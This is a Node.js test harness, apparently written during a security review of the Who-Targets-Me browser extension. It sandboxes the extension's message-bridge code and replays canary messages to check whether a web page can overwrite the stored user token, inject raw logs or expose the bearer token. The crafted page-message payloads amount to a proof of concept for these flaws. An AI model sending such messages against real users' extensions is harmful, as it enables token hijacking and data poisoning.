// Canary-first replay harness for Who-Targets-Me message-bridge candidates.
// Loads the ACTUAL HEAD source files (src/daemon/index.js and
// src/shared/handlers/onMessageEventHandler.js) into node:vm sandboxes with
// imports stripped and chrome/window/localStorage mocked, then drives the
// page->content-script->background message path with synthetic canary data.
// No network, no real credentials. Usage:
//   node scratch/wtm-bridge-replay.js --case storeUserToken|benign|sendRawLog|feedback|feedback-benign
const fs = require("fs");
const path = require("path");
const vm = require("vm");

const REPO = path.resolve(__dirname, "../Who-Targets-Me");

function load(rel) {
  return fs.readFileSync(path.join(REPO, rel), "utf8")
    .replace(/^import\s[\s\S]*?from\s*"[^"]*";\s*\n/gm, "") // strip multi-line imports
    .replace(/^import\s+"[^"]*";\s*\n/gm, "")               // strip side-effect imports
    .replace(/^export\s+const\s/gm, "const ")   // strip export keywords
    .replace(/^export\s*\{[^}]*\};?\s*$/gm, "");
}

function makeStorage(initial) {
  const store = { ...initial };
  return {
    store,
    local: {
      get: async (k) => (typeof k === "string" ? { [k]: store[k] } : store),
      set: async (obj) => Object.assign(store, obj),
      remove: async (k) => { delete store[k]; },
    },
  };
}

const args = process.argv.slice(2);
const testCase = args[args.indexOf("--case") + 1] || "storeUserToken";

// ---- background side: onMessageEventHandler with privileged sinks stubbed --
const storage = makeStorage({ general_token: "victim-canary-token", userCountry: "us" });
const calls = { sendRawLog: [], registered: [], deleted: 0, postedToTab: [] };
const bgSrc = load("src/shared/handlers/onMessageEventHandler.js");
const bgCtx = vm.createContext({
  console,
  process: { env: { BROWSER: "chrome" } },
  sendRawLog: (p) => calls.sendRawLog.push(p),
  setToStorage: async (k, v) => { storage.store[k] = v; },
  readStorage: async (k) => storage.store[k],
  removeFromStorage: async (k) => { delete storage.store[k]; },
  handleUserRegistration: async (p, cb) => { calls.registered.push(p); await cb({ token: "fresh-canary-token" }); },
  handleUserDeletion: async () => { calls.deleted++; },
  postMessageToFirstActiveTab: async (p) => { calls.postedToTab.push(p); deliverToActiveTab(p); },
  handleYGRedirect: () => {},
  getUser: async () => ({
    isLoggedIn: true,
    update: () => {},
    setAskMeLaterConsentDate: () => {},
    hasConsentedForPlatform: () => true,
  }),
  euCountries: ["de", "fr"],
  chrome: { runtime: { reload: () => {} } },
});
vm.runInContext(bgSrc + "\nthis.__handler = onMessageEventHandler;", bgCtx);

// ---- content-script side: src/daemon/index.js bridge -----------------------
const pageListeners = [];
const extListeners = [];
let pageLocalStorage = {};
const pagePostLog = [];
function deliverToActiveTab(payload) {
  // postMessageToFirstActiveTab -> tabs.sendMessage -> content-script runtime listener
  extListeners.forEach((l) => l(payload));
}
const chromeMock = {
  runtime: {
    sendMessage: (msg) => bgCtx.__handler(msg),
    onMessage: { addListener: (l) => extListeners.push(l) },
    getURL: (p) => "chrome-extension://wtmcanaryid/" + p,
  },
  storage: storage,
};
const windowMock = {
  addEventListener: (type, l) => { if (type === "message") pageListeners.push(l); },
  postMessage: (data) => { pagePostLog.push(data); },
  location: { href: "https://www.facebook.com/canary" },
};
const csSrc = load("src/daemon/index.js");
const csCtx = vm.createContext({
  console, window: windowMock, localStorage: {
    setItem: (k, v) => { pageLocalStorage[k] = v; },
    getItem: (k) => pageLocalStorage[k],
  },
  getActiveBrowser: () => chromeMock,
  handleScriptInjection: async () => {},
});
csCtx.globalThis = csCtx;
vm.runInContext(csSrc, csCtx);

function pagePost(msg) {
  // a script running in the page's main world posts to the content script
  const event = { source: windowMock, data: msg };
  return Promise.all(pageListeners.map((l) => l(event)));
}

const flush = () => new Promise((r) => setTimeout(r, 50));

(async () => {
  switch (testCase) {
    case "storeUserToken":
      await pagePost({ storeUserToken: true, token: "attacker-canary-token" });
      await flush();
      console.log("general_token after page message:", storage.store.general_token);
      console.log(storage.store.general_token === "attacker-canary-token"
        ? "RESULT: OVERWRITTEN by page-controlled message"
        : "RESULT: unchanged");
      break;
    case "benign":
      await pagePost({ totallyUnrelatedKey: "hello" });
      await flush();
      console.log("general_token after benign page message:", storage.store.general_token);
      console.log(storage.store.general_token === "victim-canary-token"
        ? "RESULT: unchanged (control)" : "RESULT: unexpectedly changed");
      break;
    case "sendRawLog":
      await pagePost({ action: "SEND_RAW_LOG", payload: { type: "YOUTUBE", body: { advert: "attacker-canary-payload" } } });
      await flush();
      console.log("sendRawLog calls:", JSON.stringify(calls.sendRawLog));
      console.log(calls.sendRawLog.length > 0
        ? "RESULT: page-injected rawlog accepted"
        : "RESULT: rejected");
      break;
    case "feedback":
      deliverToActiveTab({ registrationFeedback: { token: "fresh-canary-token" } });
      await flush();
      console.log("page localStorage:", JSON.stringify(pageLocalStorage));
      console.log("page postMessage log:", JSON.stringify(pagePostLog));
      console.log(pageLocalStorage.general_token
        ? "RESULT: bearer token written to page-origin localStorage and broadcast"
        : "RESULT: not exposed");
      break;
    case "feedback-benign":
      deliverToActiveTab({ someOtherMessage: true });
      await flush();
      console.log("page localStorage:", JSON.stringify(pageLocalStorage));
      console.log(!pageLocalStorage.general_token ? "RESULT: nothing written (control)" : "RESULT: unexpectedly written");
      break;
    default:
      console.error("unknown case", testCase);
      process.exit(2);
  }
})().catch((e) => { console.error(e); process.exit(1); });
